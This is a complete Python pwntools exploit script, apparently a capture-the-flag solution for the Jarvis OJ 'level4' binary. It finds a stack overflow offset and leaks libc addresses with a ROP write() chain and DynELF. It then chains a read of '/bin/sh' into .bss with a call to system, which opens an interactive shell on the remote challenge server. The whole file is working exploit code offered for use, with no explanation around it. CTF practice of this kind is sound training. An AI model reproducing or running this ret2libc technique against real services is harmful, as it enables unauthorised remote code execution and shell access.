from pwn import *

context.arch = "i386"
context.terminal = ['tmux', 'splitw', '-h']


class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        if binary_file:
            self.binary_file = binary_file
            self.elf = ELF(self.binary_file)
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']


    def get_overflow_position(self):
        io = self.get_io(False)
        io.send(cyclic(500))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.eip = cyclic_find(p32(core.eip))
            print 'eip:', hex(self.eip)


    def get_io(self, remote_sign=False):
        io = None
        if remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process(self.binary_file)
        return io


    def leak(self, address):
        rop = ROP(self.elf)
        rop.write(1, address, 4)
        rop.main()
        self.io.send(fit({self.eip:rop.chain()}))
        data = self.io.recv(4)
        return data

    
    def get_shell(self):
        self.io = self.get_io(True)

        de = DynELF(elf=self.elf, leak=self.leak)
        system_leak_addr = de.lookup('system', 'libc') 
        print 'system_leak_addr:', hex(system_leak_addr)

        rop = ROP(self.elf)
        bin_dash = '/bin/sh\x00'
        rop.read(0, self.elf.bss(), len(bin_dash))
        rop.call(system_leak_addr, [self.elf.bss()])

        self.io.send(fit({self.eip:rop.chain()}))
        self.io.interactive()


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9880}, binary_file='./level4')
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()

